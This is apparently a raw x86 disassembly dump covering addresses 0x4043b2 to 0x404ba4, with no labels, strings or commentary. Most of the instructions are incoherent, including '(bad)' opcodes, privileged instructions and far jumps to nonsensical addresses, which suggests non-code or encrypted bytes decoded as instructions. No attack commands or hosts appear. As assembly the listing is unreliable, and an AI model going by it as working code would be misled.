  4043b2:	xlat   BYTE PTR ds:[ebx]
  4043b3:	stc    
  4043b4:	fild   QWORD PTR [eax-0x6c]
  4043b7:	push   0x2d
  4043b9:	or     eax,0x2cf33ee0
  4043bf:	fistp  WORD PTR [edx+ebx*8]
  4043c2:	mov    edx,0x94489bcc
  4043c7:	fiadd  DWORD PTR [edx-0x4cdccbd]
  4043cd:	mov    esp,0xa4db3f80
  4043d2:	adc    ecx,DWORD PTR [edi]
  4043d4:	mov    ch,0x43
  4043d6:	push   edx
  4043d7:	push   edx
  4043d8:	je     0x4043a1
  4043da:	xchg   esi,eax
  4043db:	hlt    
  4043dc:	fisubr WORD PTR [ecx+edi*2-0x48]
  4043e0:	dec    ecx
  4043e1:	ins    DWORD PTR es:[edi],dx
  4043e2:	jge    0x404426
  4043e4:	mov    dh,0xf6
  4043e6:	(bad)  
  4043e7:	push   cs
  4043e8:	mov    cs,WORD PTR [ebp+0x23a3d5e5]
  4043ee:	and    BYTE PTR [edi],0xb7
  4043f1:	fisub  WORD PTR [edi]
  4043f3:	dec    ebx
  4043f4:	leave  
  4043f5:	xor    al,0x9f
  4043f7:	sbb    esi,esp
  4043f9:	pusha  
  4043fa:	stc    
  4043fb:	scas   al,BYTE PTR es:[edi]
  4043fc:	mov    al,0xbb
  4043fe:	fisubr WORD PTR [edx+0x74]
  404401:	out    0x8e,al
  404403:	cmp    DWORD PTR fs:[edx+0x6d880d98],ecx
  40440a:	jmp    0x404482
  40440c:	ins    BYTE PTR es:[edi],dx
  40440d:	ss dec esp
  40440f:	add    eax,DWORD PTR [edx-0x15c929a9]
  404415:	fcomi  st,st(7)
  404417:	xchg   ebx,eax
  404418:	mov    edi,0x7f503d78
  40441d:	mov    es:0x2538b3e1,al
  404423:	push   cs
  404424:	xchg   esi,eax
  404425:	imul   ecx,eax,0x64
  404428:	pop    es
  404429:	mov    ebx,0xf11892f9
  40442e:	cs inc ebx
  404430:	mov    WORD PTR [eax+0x52],es
  404433:	mov    dl,0x7e
  404435:	or     al,BYTE PTR ds:0x99f21ef6
  40443b:	adc    DWORD PTR [ebp-0x9],edi
  40443e:	in     eax,dx
  40443f:	mov    ecx,0xfa5ed8d4
  404444:	dec    esp
  404445:	lahf   
  404446:	xchg   ebx,eax
  404447:	retf   
  404448:	xchg   BYTE PTR [edx-0x48a81cb2],al
  40444e:	or     BYTE PTR [ecx],dl
  404450:	pusha  
  404451:	jmp    0xac063c3c
  404456:	and    eax,0x2def6f59
  40445b:	jne    0x4044bd
  40445d:	cmp    eax,0xde641457
  404462:	xchg   DWORD PTR [ecx+0x73fe3161],esp
  404468:	jnp    0x40448e
  40446a:	push   0xdf0bb684
  40446f:	mov    ebp,0x7c3460bd
  404474:	mov    ch,0x7b
  404476:	imul   esp,DWORD PTR [esp+eax*8-0x9666272],0x60
  40447e:	cld    
  40447f:	das    
  404480:	push   edi
  404481:	push   ebp
  404482:	inc    edi
  404483:	push   edx
  404484:	push   ecx
  404485:	leave  
  404486:	(bad)  
  404487:	pop    edx
  404488:	bswap  esp
  40448a:	into   
  40448b:	cmp    bh,BYTE PTR [ebx+0x10572d0e]
  404491:	or     DWORD PTR [ecx-0x1f],ebp
  404494:	jmp    0xb001ed2a
  404499:	xor    al,0x90
  40449b:	in     eax,0xf2
  40449d:	adc    esi,DWORD PTR ds:0xba3b049e
  4044a3:	dec    esp
  4044a4:	inc    DWORD PTR cs:[ecx+0x722505a4]
  4044ab:	jmp    0x404452
  4044ad:	(bad)  
  4044ae:	adc    ebx,edx
  4044b0:	jle    0x4044ad
  4044b2:	and    eax,0x5a14d267
  4044b7:	test   BYTE PTR [ebx+0x8175a2e],al
  4044bd:	loop   0x40449c
  4044bf:	push   0xb9bfed94
  4044c4:	mov    ch,0x47
  4044c6:	outs   dx,BYTE PTR ds:[esi]
  4044c7:	and    DWORD PTR [ebp-0x56ea9a6a],esi
  4044cd:	mov    cs,edi
  4044cf:	sahf   
  4044d0:	sub    esi,DWORD PTR ds:0x1338feb7
  4044d6:	mov    eax,0x381fed63
  4044db:	mov    ebx,0x7b986673
  4044e0:	test   ebx,edx
  4044e2:	adc    al,0x43
  4044e4:	mov    eax,0xbcccf974
  4044e9:	outs   dx,BYTE PTR ds:[esi]
  4044ea:	sbb    dl,BYTE PTR [ebx]
  4044ec:	ds inc ebx
  4044ee:	pushf  
  4044ef:	sbb    al,0x39
  4044f1:	jae    0x404538
  4044f3:	and    BYTE PTR [edi+0x56c0021e],bh
  4044f9:	xor    BYTE PTR [ecx],al
  4044fb:	mov    dl,0x52
  4044fd:	inc    edx
  4044fe:	jp     0x4044f4
  404500:	dec    ebx
  404501:	fistp  WORD PTR [edi+eiz*4-0x69]
  404505:	inc    ebp
  404506:	int    0x72
  404508:	mov    dh,0x66
  40450a:	stos   DWORD PTR es:[edi],eax
  40450b:	and    dl,BYTE PTR [edx]
  40450d:	push   0xffffffa9
  40450f:	sub    BYTE PTR [eax],ch
  404511:	les    esi,FWORD PTR [edi-0x14]
  404514:	imul   edi,DWORD PTR [ecx-0x76],0x15611496
  40451b:	fbld   TBYTE PTR [edx]
  40451d:	dec    ebx
  40451e:	push   0xc9788c64
  404523:	fisttp WORD PTR [ebx-0x14]
  404526:	mov    ecx,0x26d6feb5
  40452b:	loope  0x4044b1
  40452d:	push   edx
  40452e:	sub    eax,0xd993f418
  404533:	cli    
  404534:	enter  0x8229,0xed
  404538:	sbb    DWORD PTR [ecx-0x17928106],edx
  40453e:	hlt    
  40453f:	mov    cl,0xbe
  404541:	mov    WORD PTR [ebp-0x1de0ffac],?
  404547:	cmp    DWORD PTR [esi],eax
  404549:	and    DWORD PTR [ebx+0x458fdb17],eax
  40454f:	loop   0x4045bb
  404551:	mov    dl,0xd1
  404553:	(bad)
  404557:	lods   al,BYTE PTR ds:[esi]
  404558:	clc    
  404559:	cmp    DWORD PTR [ebp-0x7a],ebp
  40455c:	inc    eax
  40455d:	fcom   DWORD PTR [edi-0x6e]
  404560:	sub    eax,0x307fda86
  404565:	push   ebx
  404566:	jmp    0x9a2d:0xd6f67f3
  40456d:	add    DWORD PTR ds:0xef442516,ebp
  404573:	mov    eax,ds:0x50df53d3
  404578:	push   es
  404579:	test   eax,0xd91fa07c
  40457e:	imul   ebp,DWORD PTR [esi-0x6ebb2396],0xffffffa4
  404585:	in     eax,dx
  404586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404587:	mov    ecx,0x325d9404
  40458c:	mov    esi,eax
  40458e:	ror    BYTE PTR [ebx+edx*4-0x2a],1
  404592:	scas   al,BYTE PTR es:[edi]
  404593:	cmp    al,0x70
  404595:	leave  
  404596:	scas   eax,DWORD PTR es:[edi]
  404597:	xchg   ebx,eax
  404598:	push   ecx
  404599:	add    al,0x31
  40459b:	fild   QWORD PTR [ebp-0x52]
  40459e:	jp     0x404604
  4045a0:	add    eax,esp
  4045a2:	dec    edi
  4045a3:	mov    ebp,0xcf5db0e4
  4045a8:	add    BYTE PTR [ecx-0x42fef1d7],0x61
  4045af:	pop    ecx
  4045b0:	loop   0x40459e
  4045b2:	sub    BYTE PTR [edi],bh
  4045b4:	cwde   
  4045b5:	pop    esi
  4045b6:	add    eax,0x25d62e8d
  4045bb:	ja     0x4045f6
  4045bd:	aas    
  4045be:	test   al,0x11
  4045c0:	stos   DWORD PTR es:[edi],eax
  4045c1:	mov    ah,0x3a
  4045c3:	ss in  eax,dx
  4045c5:	sbb    DWORD PTR [ebp-0x5d51372b],edi
  4045cb:	mov    BYTE PTR [ebx+0x37],0x16
  4045cf:	and    edx,DWORD PTR [edx+0xc053979]
  4045d5:	aad    0xe3
  4045d7:	aam    0x67
  4045d9:	mov    ebx,0x6990b432
  4045de:	jbe    0x40459a
  4045e0:	cs sahf 
  4045e2:	test   DWORD PTR [eax+0x71dab54b],0xafc84b37
  4045ec:	add    edi,eax
  4045ee:	push   ebx
  4045ef:	fcompp 
  4045f1:	rcl    DWORD PTR [esi+eiz*4-0x464a040c],0x21
  4045f9:	stc    
  4045fa:	mov    cl,0x4c
  4045fc:	pop    eax
  4045fd:	loope  0x404597
  4045ff:	xchg   ebx,eax
  404600:	(bad)
  404604:	aad    0xf9
  404606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404607:	lods   eax,DWORD PTR ds:[esi]
  404608:	xlat   BYTE PTR ds:[ebx]
  404609:	sub    al,0x6c
  40460b:	out    dx,eax
  40460c:	in     al,dx
  40460d:	in     al,dx
  40460e:	lock sahf 
  404610:	or     esp,DWORD PTR [ebx+0x729bfb9f]
  404616:	xor    al,0x5d
  404618:	xchg   esp,eax
  404619:	shr    BYTE PTR [ebx-0x17ca2628],1
  40461f:	je     0x40467f
  404621:	and    eax,DWORD PTR [ebx-0x6436d493]
  404627:	gs push ebx
  404629:	lods   al,BYTE PTR ds:[esi]
  40462a:	pop    ds
  40462b:	xchg   BYTE PTR [ebp+0x4b],cl
  40462e:	add    DWORD PTR [edi],ebx
  404630:	xchg   edi,eax
  404631:	loopne 0x404621
  404633:	mov    ecx,0x876e206a
  404638:	or     ah,al
  40463a:	pop    ebp
  40463b:	xchg   ebx,eax
  40463c:	sbb    cl,BYTE PTR [ebp+0x77]
  40463f:	jnp    0x404664
  404641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404642:	stc    
  404643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404644:	fadd   QWORD PTR [esp+eax*4+0x5e3a5962]
  40464b:	fsubrp st(6),st
  40464d:	cmp    edi,DWORD PTR [ebp+ebp*2+0x72]
  404651:	pusha  
  404652:	push   ds
  404653:	mov    dh,0x36
  404655:	xchg   ecx,eax
  404656:	sbb    cl,BYTE PTR [eax]
  404658:	in     eax,0xc3
  40465a:	std    
  40465b:	push   ebx
  40465c:	mov    dh,BYTE PTR [eax]
  40465e:	mov    ch,0xf9
  404660:	mov    ds:0xf3659586,al
  404665:	sub    al,BYTE PTR [ebx]
  404667:	sar    DWORD PTR [ebp+0x50],cl
  40466a:	pop    esi
  40466b:	imul   edi,eax,0xffffffce
  40466e:	fs popa 
  404670:	loop   0x4046d6
  404672:	test   DWORD PTR [esi+0x621f91a0],edi
  404678:	xor    al,BYTE PTR [edi+eiz*4-0x2e1aac9b]
  40467f:	push   ebp
  404680:	jecxz  0x40468e
  404682:	sti    
  404683:	inc    esp
  404684:	(bad)  
  404685:	lahf   
  404686:	(bad)  [edx+0x2f1a0057]
  40468c:	jnp    0x4046dc
  40468e:	call   0x5389:0x271a7e2b
  404695:	aad    0xdd
  404697:	adc    al,0x24
  404699:	imul   ebp,ebp,0xf327f752
  40469f:	call   FWORD PTR ss:[ecx+0x7b]
  4046a3:	call   0x96ca:0xd8fa415
  4046aa:	jno    0x404694
  4046ac:	and    DWORD PTR [edi],edx
  4046ae:	pop    edx
  4046af:	push   ss
  4046b0:	shr    DWORD PTR [edi-0x58],cl
  4046b3:	or     BYTE PTR [eax-0x3108d652],dl
  4046b9:	or     edi,DWORD PTR [edi+0x49b510b9]
  4046bf:	xor    al,0xd5
  4046c1:	sbb    eax,0x6e085b1e
  4046c6:	mov    bl,0x58
  4046c8:	mov    BYTE PTR [ebp+0x77],bh
  4046cb:	mov    WORD PTR [eax+0x19],ds
  4046ce:	push   ebx
  4046cf:	push   edx
  4046d0:	test   eax,0x9d5e9dfa
  4046d5:	daa    
  4046d6:	lahf   
  4046d7:	lahf   
  4046d8:	sub    cl,al
  4046da:	pop    esi
  4046db:	add    al,0xd0
  4046dd:	sub    eax,0x26976e7a
  4046e2:	cmp    DWORD PTR ds:0xc6956b34,esi
  4046e8:	cmp    al,0x23
  4046ea:	adc    eax,0x9b058fee
  4046ef:	push   esp
  4046f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046f1:	stos   BYTE PTR es:[edi],al
  4046f2:	pop    es
  4046f3:	mov    bl,0x1b
  4046f5:	xor    BYTE PTR [ebx-0x43],cl
  4046f8:	xor    al,0x78
  4046fa:	imul   BYTE PTR [ecx-0x665e21e6]
  404700:	(bad)  
  404701:	sbb    al,0x90
  404703:	pop    ss
  404704:	mov    bl,0xea
  404706:	pushw  ds
  404708:	xchg   esp,eax
  404709:	push   es
  40470a:	or     eax,0x94af14
  40470f:	cmp    edi,DWORD PTR [ebp-0x3a]
  404712:	inc    edx
  404713:	mov    ah,0x93
  404715:	and    DWORD PTR [edi-0x5e],edi
  404718:	cmp    BYTE PTR ds:0x31afb17f,dl
  40471e:	loopne 0x404774
  404720:	ret    
  404721:	out    0xdb,eax
  404723:	shl    BYTE PTR [edx],1
  404725:	mov    edi,0xeec96f6d
  40472a:	lods   eax,DWORD PTR ds:[esi]
  40472b:	popf   
  40472c:	ror    ch,0x5e
  40472f:	add    dh,BYTE PTR [esi+0x21]
  404732:	call   FWORD PTR [edi-0x7cd8f6fb]
  404738:	cmp    cl,BYTE PTR [ecx-0x40]
  40473b:	xlat   BYTE PTR ds:[ebx]
  40473c:	shrd   ecx,edx,0x2
  404740:	or     DWORD PTR ds:0x4282d3,0x42828f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x4282af
  404753:	or     DWORD PTR ds:0x4283af,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0xaae70863
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [eax+0x1929559a],bl
  40477e:	sub    DWORD PTR [eax],0xe8b3dbb7
  404784:	xor    DWORD PTR [ecx+0x45],ecx
  404787:	push   0x852dfb5
  40478c:	rcl    bl,0x0
  40478f:	jmp    0x3e486a9d
  404794:	enter  0x4086,0x5c
  404798:	mov    al,0xb2
  40479a:	gs or  esp,esi
  40479d:	pusha  
  40479e:	rcl    BYTE PTR [ebx],0x59
  4047a1:	push   ss
  4047a2:	sets   BYTE PTR [edx+0x28acdbd6]
  4047a9:	shr    DWORD PTR [ecx+0x714c37f9],1
  4047af:	push   cs
  4047b0:	or     esi,DWORD PTR [ebx-0x3e]
  4047b3:	lods   eax,DWORD PTR ds:[esi]
  4047b4:	xchg   esi,ecx
  4047b6:	fwait
  4047b7:	sub    ah,BYTE PTR [ebx-0x68dfcedb]
  4047bd:	ins    DWORD PTR es:[edi],dx
  4047be:	stos   BYTE PTR es:[edi],al
  4047bf:	cmp    DWORD PTR [esi],edi
  4047c1:	push   ebp
  4047c2:	sbb    al,0x4c
  4047c4:	(bad)  
  4047c5:	push   0xffffff9a
  4047c7:	pop    ebx
  4047c8:	push   edi
  4047c9:	xchg   ebp,eax
  4047ca:	repz cli 
  4047cc:	mov    eax,ds:0x600613c0
  4047d1:	push   ecx
  4047d2:	daa    
  4047d3:	sbb    DWORD PTR [ebp-0x7b6a5b75],0x20
  4047da:	lahf   
  4047db:	popa   
  4047dc:	mov    ebp,0x4b8e95b9
  4047e1:	xchg   esp,eax
  4047e2:	arpl   WORD PTR ds:0xcab124d1,ax
  4047e8:	ret    0x55cc
  4047eb:	hlt    
  4047ec:	mov    esi,0x79aa9499
  4047f1:	dec    edx
  4047f2:	mov    ebp,0x333e127
  4047f7:	dec    edi
  4047f8:	jecxz  0x4047b4
  4047fa:	sbb    eax,0x5e282f7b
  4047ff:	lea    ecx,[edi]
  404801:	inc    eax
  404802:	pop    es
  404803:	jmp    0x404854
  404805:	push   esi
  404806:	or     cl,BYTE PTR [ebx]
  404808:	addr16 fchs 
  40480b:	jns    0x4047b2
  40480d:	shl    DWORD PTR [edx-0x63d573e5],cl
  404813:	inc    edi
  404814:	es push cs
  404816:	pusha  
  404817:	push   es
  404818:	je     0x40483f
  40481a:	je     0x404884
  40481c:	push   cs
  40481d:	icebp  
  40481e:	mov    bh,0x23
  404820:	fstp   QWORD PTR ds:0xc7d4385c
  404826:	mov    ecx,0x15f4cbf4
  40482b:	das    
  40482c:	mov    WORD PTR [ebx+0x7e],ds
  40482f:	rcl    ecx,cl
  404831:	data16 mov bh,bh
  404834:	sbb    eax,0x172d42d8
  404839:	mov    eax,ds:0x844a385c
  40483e:	inc    eax
  40483f:	fxch   st(3)
  404841:	push   ebp
  404842:	popa   
  404843:	pop    esp
  404844:	jno    0x4047f5
  404846:	ins    DWORD PTR es:[edi],dx
  404847:	aad    0x27
  404849:	or     ecx,DWORD PTR [ebx-0x72709182]
  40484f:	mov    al,ds:0x871c0edd
  404854:	inc    ecx
  404855:	push   ebx
  404856:	mov    edx,edx
  404858:	cdq    
  404859:	das    
  40485a:	iret   
  40485b:	in     al,0x0
  40485d:	push   cs
  40485e:	in     eax,dx
  40485f:	test   BYTE PTR [esi-0x3dba0898],cl
  404865:	mov    BYTE PTR [ebx+edi*8],ah
  404868:	inc    esi
  404869:	or     al,0x7d
  40486b:	leave  
  40486c:	pop    ebx
  40486d:	add    eax,0xf0454c30
  404872:	cmp    ebx,DWORD PTR [edi+0x14]
  404875:	ds js  0x4048ec
  404878:	int    0xbb
  40487a:	push   ebp
  40487b:	daa    
  40487c:	mov    al,0x7
  40487e:	fiadd  WORD PTR [edi+eiz*4+0x34]
  404882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404883:	jbe    0x4048cb
  404885:	and    ebp,ebx
  404887:	push   ds
  404888:	int    0x1b
  40488a:	lods   eax,DWORD PTR ds:[esi]
  40488b:	leave  
  40488c:	test   BYTE PTR [ebx+edi*8+0x33288c06],al
  404893:	wrmsr  
  404895:	hlt    
  404896:	ins    BYTE PTR es:[edi],dx
  404897:	icebp  
  404898:	pop    ds
  404899:	bound  ebx,QWORD PTR [ecx+0x66728c78]
  40489f:	mov    al,ds:0x7ac22442
  4048a4:	icebp  
  4048a5:	jo     0x404843
  4048a7:	icebp  
  4048a8:	or     eax,DWORD PTR [eax-0x6b]
  4048ab:	rol    bl,cl
  4048ad:	rcl    BYTE PTR [eax+0x22],1
  4048b0:	push   eax
  4048b1:	push   ss
  4048b2:	retf   0x7e44
  4048b5:	jl     0x40488c
  4048b7:	pop    ss
  4048b8:	push   ds
  4048b9:	sub    al,0x50
  4048bb:	pop    ecx
  4048bc:	aad    0x39
  4048be:	ins    DWORD PTR es:[edi],dx
  4048bf:	or     ecx,DWORD PTR [ecx+0x4be85b49]
  4048c5:	call   0xe2efad93
  4048ca:	into   
  4048cb:	pop    edx
  4048cc:	lahf   
  4048cd:	jno    0x4048e1
  4048cf:	sbb    esi,edx
  4048d1:	jmp    0x2486649d
  4048d6:	push   ebx
  4048d7:	inc    esp
  4048d8:	xchg   esp,eax
  4048d9:	stos   BYTE PTR es:[edi],al
  4048da:	dec    ebp
  4048db:	xchg   esi,eax
  4048dc:	lock sbb cl,BYTE PTR [ecx+ecx*2+0x5a7a46c2]
  4048e4:	cmp    esi,ebp
  4048e6:	js     0x4048ad
  4048e8:	ret    0x7a90
  4048eb:	scas   eax,DWORD PTR es:[edi]
  4048ec:	outs   dx,BYTE PTR ds:[esi]
  4048ed:	jmp    0x6d49:0xb797bfa0
  4048f4:	cmp    eax,DWORD PTR ds:0xefb135a
  4048fa:	and    eax,0xb2b245f4
  4048ff:	sbb    al,0x44
  404901:	or     ch,BYTE PTR [eax-0x515dd9a2]
  404907:	dec    ebx
  404908:	sbb    dl,BYTE PTR [ebp+0x2d]
  40490b:	add    cl,BYTE PTR [esi+0x20]
  40490e:	adc    ebp,ebx
  404910:	(bad)  
  404911:	mov    al,ds:0xe3c9f34e
  404916:	repnz rol BYTE PTR ss:[esi+eiz*2-0x2],cl
  40491c:	push   edi
  40491d:	inc    eax
  40491e:	rcr    BYTE PTR [esi],cl
  404920:	inc    esi
  404921:	pop    ebp
  404922:	mov    ebx,0xb07179e1
  404927:	jl     0x40496a
  404929:	xor    al,0xc2
  40492b:	adc    DWORD PTR [ebx],eax
  40492d:	xor    BYTE PTR [ebx+edi*1-0x67],ch
  404931:	or     bl,cl
  404933:	push   ds
  404934:	ss retf 
  404936:	adc    al,0x8d
  404938:	enter  0xe6a2,0x72
  40493c:	and    DWORD PTR [edi],0xfffffff3
  40493f:	ins    BYTE PTR es:[edi],dx
  404940:	and    BYTE PTR [edx+edx*1+0x4c1444f],bl
  404947:	hlt    
  404948:	jb     0x404971
  40494a:	aas    
  40494b:	test   al,0xd9
  40494d:	scas   al,BYTE PTR es:[edi]
  40494e:	scas   eax,DWORD PTR es:[edi]
  40494f:	test   BYTE PTR [edx-0x6a],bl
  404952:	mov    bh,0xa6
  404954:	mov    ebp,0x91056209
  404959:	les    edx,FWORD PTR [ebp-0x26]
  40495c:	jnp    0x40494b
  40495e:	(bad)  
  404960:	mov    WORD PTR [ecx],fs
  404962:	sbb    BYTE PTR [edi],cl
  404964:	xlat   BYTE PTR ds:[ebx]
  404965:	or     eax,0xbc5354a8
  40496a:	fs dec esp
  40496c:	out    dx,al
  40496d:	(bad)  
  40496e:	jge    0x4049e5
  404970:	test   BYTE PTR [ebx],ah
  404972:	pop    edx
  404973:	addr16 jae 0x404949
  404976:	pusha  
  404977:	sar    DWORD PTR [edx],0x9b
  40497a:	es dec edi
  40497c:	xchg   DWORD PTR [esi],esi
  40497e:	clc    
  40497f:	xchg   edi,eax
  404980:	push   0x64
  404982:	mov    al,ds:0xa1233f5c
  404987:	inc    ebp
  404988:	mov    dl,0x59
  40498a:	iret   
  40498b:	test   al,ch
  40498d:	cmp    eax,0x2d9d5bda
  404992:	hlt    
  404993:	pushf  
  404994:	mov    ecx,0x921a9834
  404999:	cmp    BYTE PTR ds:0xe27d33f2,0x7
  4049a0:	and    edi,DWORD PTR [edi+0x108d23c6]
  4049a6:	lods   al,BYTE PTR ds:[esi]
  4049a7:	mov    WORD PTR [edi],es
  4049a9:	xor    bh,BYTE PTR ds:0x6d1926d1
  4049af:	sbb    esp,eax
  4049b1:	and    DWORD PTR [esi+0x4b9edd1c],0xffffff8a
  4049b8:	adc    eax,0xc861ed32
  4049bd:	jnp    0x404a13
  4049bf:	in     eax,dx
  4049c0:	adc    DWORD PTR [eax+0x20],esi
  4049c3:	shl    ch,1
  4049c5:	mov    eax,0xac45947c
  4049ca:	and    al,0x6f
  4049cd:	or     BYTE PTR [bx+di],ah
  4049d0:	pop    ss
  4049d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d2:	nop
  4049d3:	pop    ebp
  4049d4:	xchg   edi,eax
  4049d5:	inc    eax
  4049d6:	mov    BYTE PTR [ecx],al
  4049d8:	(bad)  
  4049d9:	mov    eax,ds:0x6f378506
  4049de:	mov    DWORD PTR [esi+0x4798da64],ebx
  4049e4:	pusha  
  4049e5:	xor    BYTE PTR [edx-0x3b],bl
  4049e8:	ja     0x404990
  4049ea:	imul   DWORD PTR [edx+0xe]
  4049ed:	mov    cl,0xb0
  4049ef:	xchg   edi,eax
  4049f0:	std    
  4049f1:	ss aam 0xc1
  4049f4:	test   al,0x2b
  4049f6:	pushf  
  4049f7:	ret    
  4049f8:	cwde   
  4049f9:	push   edi
  4049fa:	mov    edx,DWORD PTR [esi-0x13]
  4049fd:	lock push ecx
  4049ff:	adc    eax,0x3e4c42e9
  404a04:	push   0xffffff9c
  404a06:	mov    DWORD PTR [eax-0x30a25dc1],edi
  404a0c:	(bad)  
  404a0d:	mov    eax,0xf19bd656
  404a12:	shl    DWORD PTR fs:[edi],0xa4
  404a16:	scas   eax,DWORD PTR es:[edi]
  404a17:	or     ebp,ebx
  404a19:	clc    
  404a1a:	sbb    eax,0xdd3ae30
  404a1f:	inc    esi
  404a20:	or     ecx,DWORD PTR [esi+esi*8+0x317f324e]
  404a27:	jnp    0x404a29
  404a29:	sbb    eax,0xceea9800
  404a2e:	loope  0x404a47
  404a30:	mov    ebp,0x60b91ba7
  404a35:	inc    eax
  404a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a37:	(bad)  
  404a38:	push   0xd2ce24b0
  404a3d:	push   ebp
  404a3e:	out    dx,al
  404a3f:	icebp  
  404a40:	sub    DWORD PTR [ecx+0x66],edx
  404a43:	cmp    al,0x8b
  404a45:	xor    DWORD PTR [edi-0x50],ebx
  404a48:	push   es
  404a49:	mov    bl,0x9c
  404a4b:	push   edx
  404a4c:	fstp   TBYTE PTR [edi-0x213ac5da]
  404a52:	inc    ebx
  404a53:	sub    ecx,esi
  404a55:	bound  ecx,QWORD PTR [edx+0x5c]
  404a58:	xchg   ebp,eax
  404a59:	fidivr WORD PTR [ebp-0x49]
  404a5c:	adc    al,0x6f
  404a5e:	push   cs
  404a5f:	mov    ds,WORD PTR [edi]
  404a61:	push   0xffffffe9
  404a63:	mov    ch,0x4b
  404a65:	std    
  404a66:	adc    DWORD PTR [ebx],eax
  404a68:	into   
  404a69:	(bad)  
  404a6a:	mov    al,ds:0x70876993
  404a6f:	sub    eax,0xa27366b0
  404a74:	pusha  
  404a75:	and    ebx,ebx
  404a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a78:	addr16 inc edi
  404a7a:	call   0x5c68:0x692a7457
  404a81:	mov    ah,0x63
  404a83:	sbb    esi,DWORD PTR [esi+0x31d97523]
  404a89:	pop    ebp
  404a8a:	cmp    edx,ebx
  404a8c:	pop    ss
  404a8d:	mov    al,ds:0x94881b41
  404a92:	repz sub al,ah
  404a95:	loope  0x404a2b
  404a97:	sbb    BYTE PTR ds:0x9f143bf1,dl
  404a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a9e:	mov    esi,0xb1a24d1c
  404aa3:	push   ebp
  404aa4:	xchg   ebp,eax
  404aa5:	fld    QWORD PTR [esi-0x61a86141]
  404aab:	out    0xa8,al
  404aad:	jnp    0x404b10
  404aaf:	cmp    DWORD PTR [eax-0x31f5b4e8],esp
  404ab5:	ror    BYTE PTR [ecx+0x11],0x6e
  404ab9:	repz pop es
  404abb:	fisub  WORD PTR [ebx]
  404abd:	pop    es
  404abe:	jg     0x404af9
  404ac0:	add    al,0xd5
  404ac2:	xor    BYTE PTR [esi],al
  404ac4:	test   al,0xeb
  404ac6:	xor    eax,0x63dff10e
  404acb:	adc    edi,DWORD PTR [eax]
  404acd:	fadd   st(7),st
  404acf:	cmp    edi,DWORD PTR [edi]
  404ad1:	pushf  
  404ad2:	addr16 jmp 0xa14afbb2
  404ad8:	jmp    0xa610543d
  404add:	jecxz  0x404ac1
  404adf:	pushf  
  404ae0:	push   edi
  404ae1:	(bad)  
  404ae2:	cmp    al,0x31
  404ae4:	dec    esi
  404ae5:	repz pop es
  404ae7:	test   BYTE PTR [eax],ch
  404ae9:	sub    BYTE PTR [ebx],al
  404aeb:	cmc    
  404aec:	mov    cl,0x9b
  404aee:	out    dx,al
  404aef:	pop    ebp
  404af0:	iret   
  404af1:	mov    edx,0x55f6e13a
  404af6:	lods   eax,DWORD PTR fs:[esi]
  404af8:	lahf   
  404af9:	push   ebx
  404afa:	pop    edx
  404afb:	ror    DWORD PTR [ecx],0xd3
  404afe:	xchg   edi,eax
  404aff:	pushf  
  404b00:	mov    edx,0x9f86f6aa
  404b05:	lds    edx,FWORD PTR [edi]
  404b07:	(bad)  
  404b08:	mov    ch,0x7b
  404b0a:	and    ch,ah
  404b0c:	add    DWORD PTR [eax-0x18],edx
  404b0f:	push   ebp
  404b10:	ficom  DWORD PTR [ebp-0x30ba09a7]
  404b16:	inc    ecx
  404b17:	out    dx,al
  404b18:	inc    ebx
  404b19:	hlt    
  404b1a:	xor    al,BYTE PTR [ecx-0x13]
  404b1d:	mov    eax,ds:0x41d4a54
  404b22:	mov    esi,0x1ac607e9
  404b27:	popf   
  404b28:	in     al,0x3d
  404b2a:	out    0xba,al
  404b2c:	xchg   BYTE PTR [ebp-0x78],ch
  404b2f:	mov    bh,0xfa
  404b31:	mov    eax,0xc59044b9
  404b36:	mov    al,ds:0x8b0bba76
  404b3b:	or     ecx,DWORD PTR [ebx+0x7d310453]
  404b41:	in     al,0x81
  404b43:	add    eax,0x4282c3
  404b48:	aaa    
  404b49:	add    DWORD PTR [edx+0x0],0x33
  404b4d:	shr    cl,cl
  404b4f:	fld    DWORD PTR [ebx]
  404b51:	add    BYTE PTR [eax],al
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	or     BYTE PTR [esi-0x3e9f95c7],dl
  404b65:	sbb    BYTE PTR [eax],bl
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    bh,bh
  404b6c:	in     al,0x8e
  404b6e:	es es aad 0xe0
  404b72:	cmp    eax,DWORD PTR [edx]
  404b74:	jb     0x404b3b
  404b76:	and    DWORD PTR [ebp-0x4e87c0d2],ebp
  404b7c:	mov    ch,BYTE PTR [ebp-0x39]
  404b7f:	mov    ebp,0xaf756351
  404b84:	mov    ecx,0x4ecb9462
  404b89:	in     eax,0x11
  404b8b:	sub    DWORD PTR [ecx],ecx
  404b8d:	xor    DWORD PTR [ecx],esp
  404b8f:	in     eax,0x9f
  404b91:	jp     0x404b86
  404b93:	enter  0x5ecd,0xda
  404b97:	(bad)  [ebp+0x43]
  404b9a:	inc    esp
  404b9b:	sbb    al,0xd3
  404b9d:	stos   DWORD PTR es:[edi],eax
  404b9e:	mov    dh,0x3d
  404ba0:	popf   
  404ba1:	dec    BYTE PTR [eax-0x33]
  404ba4:	into   
